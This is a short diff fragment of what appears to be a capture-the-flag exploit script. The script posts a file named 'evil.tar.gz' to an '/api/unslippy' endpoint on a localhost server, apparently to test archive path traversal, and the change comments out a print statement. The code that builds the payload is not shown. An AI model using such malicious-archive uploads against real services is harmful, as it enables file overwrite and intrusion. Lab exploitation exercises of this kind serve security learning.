@@ -24,6 +24,6 @@ with open('evil.tar.gz', 'wb') as f:
 
 url = 'http://localhost:1337/'
 r = s.post(url + '/api/unslippy', files={'file': fh.getvalue()})
-print(r.text)
+# print(r.text)
 print(s.get(url).text)
 
